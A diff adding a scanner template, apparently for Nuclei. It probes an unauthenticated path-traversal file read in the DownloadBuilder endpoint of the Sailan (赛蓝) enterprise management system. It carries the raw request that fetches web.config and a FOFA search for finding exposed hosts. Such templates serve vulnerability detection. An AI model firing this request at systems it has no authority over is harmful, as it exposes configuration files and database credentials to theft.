@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <configuration>
+            - </configuration>
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /BaseModule/ReportManage/DownloadBuilder?filename=/../web.config HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+id: sailan-DownloadBuilder-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
+        赛蓝企业管理系统 DownloadBuilder 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: 赛蓝企业管理系统 DownloadBuilder 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247485009&idx=1&sn=9ee394e34dd4830d1b9abb260499378b&chksm=c267b362f5103a747d93500c364bb48c4045abb9b55cd1e1cd78ce5c269e2c4c5b806a316d2d&token=1439003696&lang=zh_CN#rd
+    severity: high
+    tags:
+        - File reading
+        - 赛蓝企业管理系统
